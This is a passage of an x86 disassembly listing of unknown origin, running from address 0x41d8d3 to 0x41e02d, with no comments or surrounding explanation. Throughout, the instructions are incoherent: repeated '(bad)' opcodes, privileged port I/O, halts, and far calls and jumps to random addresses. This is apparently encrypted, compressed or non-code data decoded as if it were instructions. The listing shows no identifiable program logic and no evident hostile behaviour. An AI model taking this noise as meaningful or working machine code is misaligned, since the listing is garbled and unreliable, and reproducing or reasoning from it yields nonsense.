  41d8d3:	int    0x12
  41d8d5:	popf   
  41d8d6:	int    0x69
  41d8d8:	jge    0x41d906
  41d8da:	jbe    0x41d8be
  41d8dc:	outs   dx,BYTE PTR ds:[esi]
  41d8dd:	not    DWORD PTR [ebp+0x30]
  41d8e0:	pushf  
  41d8e1:	jo     0x41d879
  41d8e3:	sbb    eax,0x57ed8167
  41d8e8:	mov    al,0x94
  41d8ea:	fld    QWORD PTR [ecx+0x58]
  41d8ed:	lods   eax,DWORD PTR ds:[esi]
  41d8ee:	mov    ebp,0x533a33d4
  41d8f3:	enter  0xb3d2,0xf0
  41d8f7:	or     al,0x89
  41d8f9:	push   esi
  41d8fa:	and    al,0xf3
  41d8fc:	paddusw mm2,QWORD PTR [eax+0x4f]
  41d900:	pop    esi
  41d901:	mov    al,ds:0xcf1f93c0
  41d906:	sub    ch,BYTE PTR [edx]
  41d908:	dec    esi
  41d909:	adc    al,0x31
  41d90b:	push   cs
  41d90c:	jno    0x41d89b
  41d90e:	ins    BYTE PTR es:[edi],dx
  41d90f:	hlt    
  41d910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d911:	aad    0xc0
  41d913:	jle    0x41d94c
  41d915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d916:	mov    ch,ah
  41d918:	ss mov esp,0xd768752
  41d91e:	outs   dx,DWORD PTR ds:[esi]
  41d91f:	sar    ebx,cl
  41d921:	xor    al,0x64
  41d923:	pop    esi
  41d924:	cs or  DWORD PTR es:[edi],0xdf533f36
  41d92c:	daa    
  41d92d:	int    0x83
  41d92f:	retf   0xa7b1
  41d932:	push   ebx
  41d933:	fwait
  41d934:	outs   dx,BYTE PTR ds:[si]
  41d936:	cmp    eax,0x8aff27bc
  41d93b:	call   0xb1370f14
  41d940:	mov    ecx,0x7e4c4589
  41d945:	outs   dx,BYTE PTR ds:[esi]
  41d946:	pop    edi
  41d947:	nop
  41d948:	push   ebp
  41d949:	pop    ss
  41d94a:	aad    0x15
  41d94c:	jbe    0x41d99e
  41d94e:	test   al,0xa1
  41d950:	dec    esp
  41d951:	add    al,0x87
  41d953:	je     0x41d903
  41d955:	ret    
  41d956:	mov    DWORD PTR [ecx+0x2c],ebx
  41d959:	xchg   edx,eax
  41d95a:	mov    BYTE PTR [ebp+0x53],al
  41d95d:	add    eax,0xe52be6a3
  41d962:	xchg   esi,eax
  41d963:	inc    ebx
  41d964:	enter  0xb5fc,0x20
  41d968:	sahf   
  41d969:	in     eax,dx
  41d96a:	xor    eax,0x72e6069d
  41d96f:	xor    cl,BYTE PTR gs:[edi-0x60]
  41d973:	or     DWORD PTR [esi+0x4b125f34],ebp
  41d979:	pop    ss
  41d97a:	and    ecx,edx
  41d97c:	xlat   BYTE PTR ds:[ebx]
  41d97d:	adc    dl,BYTE PTR [esi+eax*1-0x7f]
  41d981:	leave  
  41d982:	push   edi
  41d983:	cmp    al,0x43
  41d985:	aas    
  41d986:	scas   al,BYTE PTR es:[edi]
  41d987:	pop    ebx
  41d988:	jp     0x41d9cd
  41d98a:	fisttp DWORD PTR [esi-0x6cc7c9a3]
  41d990:	mov    dl,0xb8
  41d992:	jo     0x41d9ae
  41d994:	jns    0x41d99b
  41d996:	jns    0x41d9b7
  41d998:	idiv   DWORD PTR [esi-0x30]
  41d99b:	in     al,0x4c
  41d99d:	jle    0x41d978
  41d99f:	(bad)  
  41d9a1:	inc    edx
  41d9a2:	xor    dl,ch
  41d9a4:	shr    BYTE PTR [ecx+esi*8-0x5],cl
  41d9a8:	pop    ebp
  41d9a9:	test   eax,0x33be18b2
  41d9ae:	(bad)  
  41d9af:	add    al,0xa1
  41d9b1:	js     0x41da28
  41d9b3:	fs clc 
  41d9b5:	mov    BYTE PTR [esi-0x3df0a516],ah
  41d9bb:	popa   
  41d9bc:	dec    esp
  41d9bd:	es scas eax,DWORD PTR es:[edi]
  41d9bf:	cmp    DWORD PTR [ecx-0x504c7f95],edx
  41d9c5:	dec    esi
  41d9c6:	fsubr  st(4),st
  41d9c8:	adc    edi,DWORD PTR [ebx+edx*4]
  41d9cb:	jnp    0x41da10
  41d9cd:	or     eax,DWORD PTR [esi+0xc9b154f]
  41d9d3:	rcl    DWORD PTR [edx+0x2cca4f32],1
  41d9d9:	rcl    DWORD PTR [ecx],cl
  41d9db:	push   esi
  41d9dc:	dec    edx
  41d9dd:	popf   
  41d9de:	(bad)  
  41d9e0:	jne    0x41d989
  41d9e2:	ficomp WORD PTR [ebp+edi*4+0x36588ff0]
  41d9e9:	in     eax,dx
  41d9ea:	ds push ss
  41d9ec:	fst    QWORD PTR [edi]
  41d9ee:	retf   0x6a29
  41d9f1:	shl    DWORD PTR [ebx+0x26c4d57d],0x4b
  41d9f8:	arpl   WORD PTR [ecx+0x20fe7fe3],di
  41d9fe:	dec    ebp
  41d9ff:	and    eax,0x70e2d2f2
  41da04:	push   edx
  41da05:	sub    bl,BYTE PTR [edx]
  41da07:	dec    esi
  41da08:	jbe    0x41da13
  41da0a:	inc    edi
  41da0b:	sbb    ah,cl
  41da0d:	out    0x2c,al
  41da0f:	cmp    ecx,DWORD PTR [esi-0x3e]
  41da12:	mov    ds:0x474f6da9,al
  41da17:	lods   eax,DWORD PTR ds:[esi]
  41da18:	jecxz  0x41d9c4
  41da1a:	jo     0x41d9c9
  41da1c:	fistp  QWORD PTR [edi+ebp*8]
  41da1f:	dec    BYTE PTR [eax]
  41da21:	xchg   ebp,eax
  41da22:	sub    edi,ebx
  41da24:	aaa    
  41da25:	xchg   ebp,eax
  41da26:	cmp    ebp,edx
  41da28:	scas   al,BYTE PTR es:[edi]
  41da29:	data16 je 0x41da2b
  41da2c:	repnz pop ds
  41da2e:	xchg   edx,eax
  41da2f:	or     ah,dl
  41da31:	adc    eax,0xaa95cc20
  41da36:	in     al,dx
  41da37:	dec    ecx
  41da38:	icebp  
  41da39:	test   al,0xe7
  41da3b:	jb     0x41da27
  41da3d:	adc    esp,esi
  41da3f:	daa    
  41da40:	cli    
  41da41:	add    al,0x8a
  41da43:	sub    DWORD PTR [edi],eax
  41da45:	mov    al,dh
  41da47:	mov    ch,0xfd
  41da49:	sub    al,0x7b
  41da4b:	loopne 0x41d9e5
  41da4d:	ins    BYTE PTR es:[edi],dx
  41da4e:	sub    al,BYTE PTR [esi-0x76520f3e]
  41da54:	fwait
  41da55:	inc    ecx
  41da56:	push   0x36
  41da58:	into   
  41da59:	xchg   esi,esi
  41da5b:	cld    
  41da5c:	outs   dx,DWORD PTR ds:[esi]
  41da5d:	mov    ah,0x8a
  41da5f:	xor    edx,DWORD PTR [ebp-0x8]
  41da62:	ds add eax,0x17dc6bce
  41da68:	cli    
  41da69:	mov    esi,0xea0b54be
  41da6e:	loop   0x41da4a
  41da70:	cmc    
  41da71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da72:	mov    dh,0xc
  41da74:	xchg   ebx,eax
  41da75:	mov    edi,0x6d3220a8
  41da7a:	data16 jne 0x41da04
  41da7d:	adc    eax,0xeb828db2
  41da82:	(bad)  
  41da83:	jmp    0x41da88
  41da85:	adc    DWORD PTR [edi],0x98d0a006
  41da8b:	and    al,0x4c
  41da8d:	or     eax,0x9044487e
  41da92:	pop    edx
  41da93:	mov    ch,0x13
  41da95:	push   esp
  41da96:	dec    ebx
  41da97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da98:	dec    ecx
  41da99:	adc    ch,cl
  41da9b:	dec    esi
  41da9c:	jnp    0x41daef
  41da9e:	scas   eax,DWORD PTR es:[edi]
  41da9f:	jl     0x41da36
  41daa1:	xchg   ecx,eax
  41daa2:	(bad)  
  41daa3:	clc    
  41daa4:	inc    esp
  41daa5:	das    
  41daa6:	ret    0x34ac
  41daa9:	adc    DWORD PTR [eax*4+0x74f3b2bb],0xffffffaf
  41dab1:	data16 fidivr DWORD PTR [ebp+0x6a6cca30]
  41dab8:	mov    cl,dl
  41daba:	and    al,0x86
  41dabc:	popa   
  41dabd:	jp     0x41db20
  41dabf:	xlat   BYTE PTR ds:[ebx]
  41dac0:	xchg   edi,eax
  41dac1:	cmp    ch,ah
  41dac3:	dec    ebp
  41dac4:	xor    ecx,0xffffffe4
  41dac7:	mov    dh,0x57
  41dac9:	jg     0x41daad
  41dacb:	sub    al,0x71
  41dacd:	mov    ebx,0xef0a9d32
  41dad2:	mov    esi,0xcf6a5f61
  41dad7:	imul   ebp,ebx,0xc5181eef
  41dadd:	out    dx,al
  41dade:	cmp    BYTE PTR [ebx+0xcaa11f2],dl
  41dae4:	sti    
  41dae5:	adc    DWORD PTR [eax+edx*4+0x20],eax
  41dae9:	iret   
  41daea:	pop    edx
  41daeb:	push   0x31742f3c
  41daf0:	outs   dx,BYTE PTR ds:[esi]
  41daf1:	mov    ah,0xe2
  41daf3:	mov    esp,0x723bd828
  41daf8:	cmp    ebp,DWORD PTR [ebx+eax*4]
  41dafb:	es ret 0xc1be
  41daff:	inc    ebp
  41db00:	sahf   
  41db01:	mov    al,ds:0x40be9267
  41db06:	sub    eax,0x197231ff
  41db0b:	scas   eax,DWORD PTR es:[edi]
  41db0c:	popf   
  41db0d:	push   cs
  41db0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db0f:	mov    ecx,0x378f23bd
  41db14:	in     eax,dx
  41db15:	dec    edx
  41db16:	or     al,0x35
  41db18:	sbb    eax,0xeac3d287
  41db1d:	jp     0x41db50
  41db1f:	ja     0x41dad1
  41db21:	mov    esi,0x198cb9ea
  41db26:	fdiv   DWORD PTR [esi+0x316f1b16]
  41db2c:	ins    DWORD PTR es:[edi],dx
  41db2d:	push   ecx
  41db2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db2f:	iret   
  41db30:	pop    eax
  41db31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db32:	aad    0x94
  41db34:	mov    ds:0x7f17056a,al
  41db39:	adc    eax,0x1d9e43e9
  41db3e:	in     al,0xe7
  41db40:	in     eax,0x75
  41db42:	(bad)  
  41db43:	jle    0x41daf7
  41db45:	aaa    
  41db46:	nop
  41db47:	push   edi
  41db48:	sub    DWORD PTR [edx+0x383f2439],esi
  41db4e:	sbb    al,0xcf
  41db50:	in     al,dx
  41db51:	mov    bh,0x2e
  41db53:	or     DWORD PTR [ebp+ebp*8+0x44],edi
  41db57:	ficomp DWORD PTR [esi+0x79]
  41db5a:	jmp    0xafd39468
  41db5f:	dec    eax
  41db60:	outs   dx,DWORD PTR ds:[esi]
  41db61:	xchg   esi,eax
  41db62:	ret    0xd1fd
  41db65:	mov    DWORD PTR [ebx],esi
  41db67:	sub    al,0xa2
  41db69:	fucomi st,st(5)
  41db6b:	ret    
  41db6c:	fst    DWORD PTR [ebx+eiz*4]
  41db6f:	(bad)  
  41db70:	mov    edx,DWORD PTR [ecx+0x4ba0b6e7]
  41db76:	repz retf 
  41db78:	mov    BYTE PTR [edx-0x29278f9],dl
  41db7e:	(bad)  
  41db7f:	in     eax,dx
  41db80:	fwait
  41db81:	retf   0x275e
  41db84:	jo     0x41db1a
  41db86:	jle    0x41dbdd
  41db88:	rcl    BYTE PTR [ecx],cl
  41db8a:	push   ecx
  41db8b:	cmp    eax,0xa69cf317
  41db90:	stos   DWORD PTR es:[edi],eax
  41db91:	lock mov eax,ds:0x576a6b26
  41db97:	xchg   esi,eax
  41db98:	or     al,0x8e
  41db9a:	xchg   DWORD PTR [ebp-0x56],eax
  41db9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db9e:	inc    edx
  41db9f:	stos   BYTE PTR es:[edi],al
  41dba0:	popf   
  41dba1:	loope  0x41dbe2
  41dba3:	jnp    0x41dc17
  41dba5:	scas   al,BYTE PTR es:[edi]
  41dba6:	pop    edx
  41dba7:	pop    es
  41dba8:	aam    0xde
  41dbaa:	push   cs
  41dbab:	out    0xfd,eax
  41dbad:	jg     0x41db91
  41dbaf:	ror    BYTE PTR [ebp-0x70011595],cl
  41dbb5:	out    0x82,eax
  41dbb7:	jle    0x41db9b
  41dbb9:	in     eax,dx
  41dbba:	inc    ecx
  41dbbb:	call   0x6686:0xab429f7e
  41dbc2:	mov    BYTE PTR [esi],ah
  41dbc4:	mov    bh,0x25
  41dbc6:	loopne 0x41db72
  41dbc8:	cmp    DWORD PTR [ebp+0x5cc53e2c],esp
  41dbce:	lds    ebx,FWORD PTR [eax]
  41dbd0:	pop    esi
  41dbd1:	adc    DWORD PTR [ebx],edi
  41dbd3:	out    0x8f,eax
  41dbd5:	and    eax,0xc5905793
  41dbda:	jae    0x41dc1b
  41dbdc:	aas    
  41dbdd:	scas   al,BYTE PTR es:[edi]
  41dbde:	or     ecx,DWORD PTR [ebx]
  41dbe0:	add    ch,BYTE PTR [eax+ebp*8-0x54]
  41dbe4:	adc    al,BYTE PTR [ebx-0x53]
  41dbe7:	ja     0x41db73
  41dbe9:	out    dx,eax
  41dbea:	retf   
  41dbeb:	into   
  41dbec:	adc    ecx,DWORD PTR [eax-0x708890e8]
  41dbf2:	ja     0x41dbaf
  41dbf4:	push   ds
  41dbf5:	push   0xffffffb3
  41dbf7:	cmp    DWORD PTR [edi],0x75f673a7
  41dbfd:	mov    WORD PTR [ebx],es
  41dbff:	dec    ebp
  41dc00:	push   esp
  41dc01:	cmp    BYTE PTR [ecx],0x7f
  41dc04:	inc    esi
  41dc05:	out    0xdf,al
  41dc07:	dec    eax
  41dc08:	scas   eax,DWORD PTR es:[edi]
  41dc09:	nop
  41dc0a:	icebp  
  41dc0b:	icebp  
  41dc0c:	mov    ds:0xd82b8f52,eax
  41dc11:	les    esi,FWORD PTR [eax-0x1d]
  41dc14:	stc    
  41dc15:	jbe    0x41dbeb
  41dc17:	rcr    BYTE PTR [edx],1
  41dc19:	mov    DWORD PTR [esi+0x6150fa37],esi
  41dc1f:	out    0x2c,al
  41dc21:	sub    eax,0x70d9f614
  41dc26:	lods   al,BYTE PTR ds:[esi]
  41dc27:	call   0x6318:0x77455619
  41dc2e:	js     0x41dc4e
  41dc30:	test   eax,0x4ce4f9b0
  41dc35:	mov    ah,0x54
  41dc37:	mov    bh,0xe4
  41dc39:	jnp    0x41dc30
  41dc3b:	push   ecx
  41dc3c:	and    DWORD PTR [edi],eax
  41dc3e:	mov    ebp,es
  41dc40:	jmp    0xe4cd8434
  41dc45:	adc    bh,dl
  41dc47:	push   edi
  41dc48:	cmp    ebp,esp
  41dc4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc4b:	pop    edi
  41dc4c:	test   BYTE PTR [ebp+0x7dc435fe],bh
  41dc52:	clc    
  41dc53:	cmc    
  41dc54:	aas    
  41dc55:	data16 test al,0xee
  41dc58:	jnp    0x41dc0c
  41dc5a:	jecxz  0x41dc46
  41dc5c:	mov    edi,0x11c986ed
  41dc61:	frstor [edi]
  41dc63:	jl     0x41dc3c
  41dc65:	xchg   BYTE PTR [esi+0x5338d0a9],dl
  41dc6b:	and    eax,0xa28d25bd
  41dc70:	hlt    
  41dc71:	sbb    al,BYTE PTR [eax+0x7813c9f9]
  41dc77:	mov    al,ds:0xc503ab27
  41dc7c:	sbb    ebx,DWORD PTR [edi+0x3]
  41dc7f:	stos   DWORD PTR es:[edi],eax
  41dc80:	sbb    cl,BYTE PTR [esi+0x3]
  41dc83:	pop    eax
  41dc84:	cwde   
  41dc85:	shl    DWORD PTR [ebx-0x44],cl
  41dc88:	xor    dh,bh
  41dc8a:	pop    ds
  41dc8b:	cld    
  41dc8c:	mov    bl,0xeb
  41dc8e:	cmp    al,0xaa
  41dc90:	sbb    BYTE PTR [eax+esi*2-0x7c],bl
  41dc94:	cwde   
  41dc95:	pop    ds
  41dc96:	mov    eax,ds:0x9b6fcd51
  41dc9b:	jle    0x41dd04
  41dc9d:	jl     0x41dc42
  41dc9f:	imul   ebx,DWORD PTR [ecx+edx*1+0x46bebae2],0x28
  41dca7:	stos   BYTE PTR es:[edi],al
  41dca8:	pop    ecx
  41dca9:	fistp  DWORD PTR cs:[eax]
  41dcac:	mov    bh,0xe5
  41dcae:	lods   eax,DWORD PTR ds:[esi]
  41dcaf:	or     edx,DWORD PTR [ecx]
  41dcb1:	cdq    
  41dcb2:	cmp    eax,0x9e4c93af
  41dcb7:	addr16 call 0x6147:0x685c5700
  41dcbf:	mov    ch,BYTE PTR fs:[ecx-0x1b2f43dd]
  41dcc6:	call   0x4c004891
  41dccb:	mov    ecx,0x6406d01
  41dcd0:	test   dh,0x78
  41dcd3:	std    
  41dcd4:	push   edx
  41dcd5:	hlt    
  41dcd6:	push   cs
  41dcd7:	imul   edi,DWORD PTR [ebx-0x26],0xc4bd5937
  41dcde:	xchg   esp,eax
  41dcdf:	mov    ch,0xf5
  41dce1:	rol    BYTE PTR [ecx-0x5b5c6815],cl
  41dce7:	pop    ss
  41dce8:	lea    ebx,[edx+edx*4+0x7dd1e097]
  41dcef:	lock mov eax,0xec041490
  41dcf5:	cs arpl ax,dx
  41dcf8:	rcr    DWORD PTR [edx-0x49],0xf9
  41dcfc:	icebp  
  41dcfd:	ds addr16 mov bh,dl
  41dd01:	xchg   esi,eax
  41dd02:	push   edi
  41dd03:	outs   dx,BYTE PTR ds:[esi]
  41dd04:	imul   esi,edx,0xffffffeb
  41dd07:	cmp    al,BYTE PTR [ebx-0x5f]
  41dd0a:	pop    edx
  41dd0b:	pop    ebx
  41dd0c:	or     al,0xc4
  41dd0e:	int3   
  41dd0f:	stc    
  41dd10:	dec    esp
  41dd11:	push   ecx
  41dd12:	cmp    DWORD PTR [ecx+0x6d],esi
  41dd15:	xlat   BYTE PTR ds:[ebx]
  41dd16:	lahf   
  41dd17:	push   es
  41dd18:	cli    
  41dd19:	mov    dh,0x19
  41dd1b:	clc    
  41dd1c:	cld    
  41dd1d:	call   0xbe76:0xac889188
  41dd24:	cmp    al,al
  41dd26:	mov    al,0x58
  41dd28:	mov    eax,ds:0xad438684
  41dd2d:	nop
  41dd2e:	pop    esp
  41dd2f:	mov    ebx,0x51c49860
  41dd34:	inc    ebp
  41dd35:	sahf   
  41dd36:	dec    eax
  41dd37:	imul   BYTE PTR [ebp-0x5f8bb499]
  41dd3d:	neg    DWORD PTR [edx]
  41dd3f:	lods   eax,DWORD PTR ds:[esi]
  41dd40:	mov    ds:0xdc0c1770,eax
  41dd45:	in     al,dx
  41dd46:	cmp    al,0xf4
  41dd48:	pushf  
  41dd49:	cmp    al,0x54
  41dd4b:	pop    esi
  41dd4c:	push   ecx
  41dd4d:	mov    ds:0x9e3c7134,al
  41dd52:	mov    dh,0xd0
  41dd54:	cmp    al,cl
  41dd56:	retf   
  41dd57:	pop    edi
  41dd58:	shr    ebx,0xbb
  41dd5b:	aas    
  41dd5c:	(bad)  
  41dd5d:	mov    edx,ebp
  41dd5f:	or     al,0x76
  41dd61:	mov    ah,0x44
  41dd63:	xchg   edx,eax
  41dd64:	out    0x34,eax
  41dd66:	(bad)  
  41dd67:	xchg   ecx,eax
  41dd68:	das    
  41dd69:	xchg   ecx,eax
  41dd6a:	pop    ds
  41dd6b:	jle    0x41ddc3
  41dd6d:	outs   dx,BYTE PTR ds:[esi]
  41dd6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd6f:	push   cs
  41dd70:	clc    
  41dd71:	pusha  
  41dd72:	xor    BYTE PTR [edi+0x31],bh
  41dd75:	sub    al,0xee
  41dd77:	jno    0x41dd6f
  41dd79:	adc    BYTE PTR [ebp+0x2d],0x31
  41dd7d:	outs   dx,BYTE PTR ds:[esi]
  41dd7e:	xchg   ecx,eax
  41dd7f:	adc    dh,0xed
  41dd82:	cmp    al,0xea
  41dd84:	rcl    dl,0x77
  41dd87:	add    esi,DWORD PTR [ebx-0x534512e]
  41dd8d:	data16 cld 
  41dd8f:	(bad)  
  41dd90:	aaa    
  41dd91:	out    0x52,al
  41dd93:	popa   
  41dd94:	or     al,0x2
  41dd96:	scas   al,BYTE PTR es:[edi]
  41dd97:	mov    edi,0x5b6d37ee
  41dd9c:	sub    ebp,DWORD PTR [eax]
  41dd9e:	jae    0x41dd9b
  41dda0:	or     al,cl
  41dda2:	mov    cl,0xd
  41dda4:	mov    dh,0x54
  41dda6:	fisub  WORD PTR [esi+0x48184304]
  41ddac:	add    bl,0x76
  41ddaf:	inc    ebp
  41ddb0:	fwait
  41ddb1:	sub    al,0x1c
  41ddb3:	add    al,0xff
  41ddb5:	data16 hlt 
  41ddb7:	mov    WORD PTR gs:[ecx-0x20],es
  41ddbb:	fisub  WORD PTR [ebx+0x344da8a1]
  41ddc1:	bound  ebx,QWORD PTR [edi+ebp*8]
  41ddc4:	jl     0x41dd98
  41ddc6:	sbb    al,0x70
  41ddc8:	in     eax,0xcc
  41ddca:	sbb    eax,0x70c0ace8
  41ddcf:	adc    ecx,DWORD PTR [esi+ebx*8]
  41ddd2:	bound  esp,QWORD PTR ds:0xc0840bc9
  41ddd8:	jle    0x41ddb7
  41ddda:	ja     0x41de15
  41dddc:	sbb    ebx,edx
  41ddde:	sbb    DWORD PTR [edi+0x1a],edi
  41dde1:	mov    cl,0x60
  41dde3:	xlat   BYTE PTR ds:[ebx]
  41dde4:	xchg   esi,eax
  41dde5:	nop
  41dde6:	push   DWORD PTR [eax+0x19]
  41dde9:	or     cl,bh
  41ddeb:	jb     0x41de02
  41dded:	dec    edx
  41ddee:	dec    edx
  41ddef:	jmp    0x75639160
  41ddf4:	xor    al,BYTE PTR [ecx+0xce0750c]
  41ddfa:	cmc    
  41ddfb:	mov    dl,0x69
  41ddfd:	mov    esi,0x8210678f
  41de02:	inc    ecx
  41de03:	aaa    
  41de04:	cmp    ebx,DWORD PTR ds:0x78c7dcde
  41de0a:	xchg   ebx,eax
  41de0b:	cmp    BYTE PTR [eax],0x3b
  41de0e:	xlat   BYTE PTR ds:[ebx]
  41de0f:	pop    ds
  41de10:	ret    0xb2ca
  41de13:	out    dx,al
  41de14:	mov    ebp,0xac39a931
  41de19:	cmp    BYTE PTR [esi],dh
  41de1b:	enter  0x8908,0xb6
  41de1f:	mov    bl,0xda
  41de21:	ds jb  0x41de85
  41de24:	xor    DWORD PTR [ebp-0x44],edi
  41de27:	arpl   WORD PTR [eax],ax
  41de29:	cmp    al,0x43
  41de2b:	sub    DWORD PTR [edx-0x26cf6b80],edx
  41de31:	mov    cl,0x82
  41de33:	loope  0x41de76
  41de35:	div    DWORD PTR [esi-0x15]
  41de38:	adc    eax,0x3f5b70fa
  41de3d:	push   esp
  41de3e:	add    BYTE PTR [ebp-0x29],ah
  41de41:	pop    edx
  41de42:	enter  0x8cc6,0x20
  41de46:	fisub  DWORD PTR [ecx+0x5b388969]
  41de4c:	inc    ebx
  41de4d:	sar    dl,1
  41de4f:	cmc    
  41de50:	mov    bl,BYTE PTR [edi]
  41de52:	lds    eax,FWORD PTR [ecx]
  41de54:	in     al,dx
  41de55:	f2xm1  
  41de57:	mov    ah,0x7c
  41de59:	fistp  QWORD PTR [edi-0x55]
  41de5c:	call   0xb423:0xa7b745ba
  41de63:	mul    DWORD PTR [ecx]
  41de65:	stos   DWORD PTR es:[edi],eax
  41de66:	(bad)  [edx+ebp*1-0x60f1e66d]
  41de6d:	mov    esi,0x56a334bd
  41de72:	mov    dl,0xdd
  41de74:	in     eax,dx
  41de75:	fisttp DWORD PTR [edx-0x171fdb31]
  41de7b:	mov    eax,ds:0xdc834c0d
  41de80:	out    0x90,al
  41de82:	pop    edi
  41de83:	adc    BYTE PTR [esi-0x5c1100d2],dl
  41de89:	sub    eax,0x9b8274c4
  41de8e:	pop    esp
  41de8f:	sub    esi,ebp
  41de91:	xlat   BYTE PTR ds:[ebx]
  41de92:	cmc    
  41de93:	rcr    BYTE PTR [ebp-0x4370118b],0x69
  41de9a:	retf   
  41de9b:	mov    esp,?
  41de9d:	or     eax,esi
  41de9f:	add    ch,bl
  41dea1:	pop    ds
  41dea2:	dec    ebp
  41dea3:	mov    al,dh
  41dea5:	(bad)  
  41dea6:	into   
  41dea7:	sbb    DWORD PTR [edi],ebp
  41dea9:	out    dx,al
  41deaa:	gs xchg dh,cl
  41dead:	arpl   WORD PTR [eax+ebp*2],di
  41deb0:	into   
  41deb1:	push   esi
  41deb2:	ss jo  0x41dea2
  41deb5:	xchg   BYTE PTR [ebx+0x6f1420f2],dh
  41debb:	fisub  DWORD PTR [ebp+0x60]
  41debe:	jmp    0x41dea5
  41dec0:	jmp    0x4a5b:0xe4c7fd41
  41dec7:	dec    edx
  41dec8:	out    dx,eax
  41dec9:	and    cl,BYTE PTR fs:[esi+0x65]
  41decd:	in     al,0x57
  41decf:	add    ebp,eax
  41ded1:	push   esp
  41ded2:	mov    esp,0x16ff474f
  41ded7:	or     cl,bl
  41ded9:	retf   
  41deda:	pop    ecx
  41dedb:	aad    0xf0
  41dedd:	mov    dh,0x9
  41dedf:	ins    DWORD PTR es:[edi],dx
  41dee0:	or     DWORD PTR [edi],ecx
  41dee2:	test   eax,0xa83a4efa
  41dee7:	mov    dl,0x9b
  41dee9:	in     al,0x29
  41deeb:	adc    dh,BYTE PTR [edi-0x40]
  41deee:	test   BYTE PTR [esi+0x2b],0x50
  41def2:	les    ecx,FWORD PTR [ebp-0x58cbf92f]
  41def8:	jno    0x41df36
  41defa:	push   esi
  41defb:	into   
  41defc:	test   bh,ch
  41defe:	mov    ah,0xef
  41df00:	retf   0x85b4
  41df03:	mov    esp,0x734bb64d
  41df08:	dec    ebp
  41df09:	mov    ds:0xa0bb261b,al
  41df0e:	add    al,0xcb
  41df10:	icebp  
  41df11:	ror    cl,1
  41df13:	mov    eax,0xaaee4c9a
  41df18:	clc    
  41df19:	inc    eax
  41df1a:	pop    ecx
  41df1b:	sub    al,0x35
  41df1d:	jl     0x41df92
  41df1f:	nop
  41df20:	jle    0x41df52
  41df22:	xor    eax,0xa0c16c77
  41df27:	and    al,ch
  41df29:	add    eax,DWORD PTR [ebx]
  41df2b:	or     eax,0xad5209b2
  41df30:	hlt    
  41df31:	add    al,0x31
  41df33:	sub    DWORD PTR [esi-0x55f5308e],0x18fa24ac
  41df3d:	inc    edx
  41df3e:	and    DWORD PTR [eax+0xb],edi
  41df41:	lock mov dh,0xae
  41df44:	leave  
  41df45:	and    al,BYTE PTR [ebx]
  41df47:	xor    esp,esi
  41df49:	mov    bh,0xfc
  41df4b:	push   0x7cfcb908
  41df50:	loope  0x41df6f
  41df52:	(bad)
  41df55:	stos   DWORD PTR es:[edi],eax
  41df56:	je     0xe3f93fd5
  41df5c:	xchg   ecx,eax
  41df5d:	arpl   WORD PTR [esi-0x65],bp
  41df60:	push   edx
  41df61:	dec    eax
  41df62:	add    BYTE PTR [edi],ah
  41df64:	ins    BYTE PTR es:[edi],dx
  41df65:	scas   al,BYTE PTR es:[edi]
  41df66:	pop    edi
  41df67:	out    dx,al
  41df68:	aaa    
  41df69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6a:	mov    bl,BYTE PTR [ecx+0x328fe2f0]
  41df70:	dec    eax
  41df71:	call   0x79f9aa74
  41df76:	mov    bl,0x26
  41df78:	sub    al,0x66
  41df7a:	mov    ah,0xd8
  41df7c:	cwde   
  41df7d:	jmp    0x41df70
  41df7f:	push   esp
  41df80:	bound  eax,QWORD PTR [ebp+0x55aa8dd8]
  41df86:	clc    
  41df87:	and    eax,0xfcd40532
  41df8c:	fdiv   QWORD PTR ds:0x22412083
  41df92:	cmp    ecx,DWORD PTR [edx-0x70]
  41df95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df96:	jno    0x41df98
  41df98:	mov    bh,0xf1
  41df9a:	adc    BYTE PTR [esi-0x7fed4954],ch
  41dfa0:	pop    es
  41dfa1:	int    0x69
  41dfa3:	mov    BYTE PTR [ecx-0x24],cl
  41dfa6:	fs lahf 
  41dfa8:	aam    0x8f
  41dfaa:	or     al,0x79
  41dfac:	xor    BYTE PTR [ebp-0x47edb950],bl
  41dfb2:	add    BYTE PTR [edx+0x7c],0xd9
  41dfb6:	jno    0x41df6a
  41dfb8:	mov    bl,0xf4
  41dfba:	add    DWORD PTR [edx+0x4d8e85b8],0xb80622f9
  41dfc4:	stos   DWORD PTR es:[edi],eax
  41dfc5:	sbb    eax,0x19206038
  41dfca:	inc    eax
  41dfcb:	fwait
  41dfcc:	push   0x538075b4
  41dfd1:	out    0xb5,eax
  41dfd3:	mov    bh,0xf8
  41dfd5:	sar    DWORD PTR [edi+0x3efc5ba9],cl
  41dfdb:	popa   
  41dfdc:	mov    dl,0x95
  41dfde:	fcom   QWORD PTR [ebx+edx*8+0xbc557]
  41dfe5:	test   al,0xf6
  41dfe7:	mov    al,0x61
  41dfe9:	das    
  41dfea:	push   esi
  41dfeb:	cmp    al,0x16
  41dfed:	lods   al,BYTE PTR ds:[esi]
  41dfee:	lea    edx,[edx+0x6a78c82b]
  41dff4:	js     0x41e041
  41dff6:	leave  
  41dff7:	into   
  41dff8:	jo     0x41e032
  41dffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dffb:	cmp    cl,ah
  41dffd:	pop    esi
  41dffe:	and    BYTE PTR [ebx],ch
  41e000:	jg     0x41df8c
  41e002:	add    BYTE PTR ds:0x888e41a4,ah
  41e008:	aas    
  41e009:	mov    ebx,0x7e220f35
  41e00e:	push   0xb212cb7
  41e013:	jge    0x41e065
  41e015:	leave  
  41e016:	mov    dh,al
  41e018:	idiv   al
  41e01a:	sbb    ecx,edi
  41e01c:	cmp    al,0x7d
  41e01e:	aaa    
  41e01f:	ja     0x41e067
  41e021:	les    esp,FWORD PTR [edi-0x4479c7c5]
  41e027:	clc    
  41e028:	mov    edx,0xb3f13622
  41e02d:	jb     0x41e069
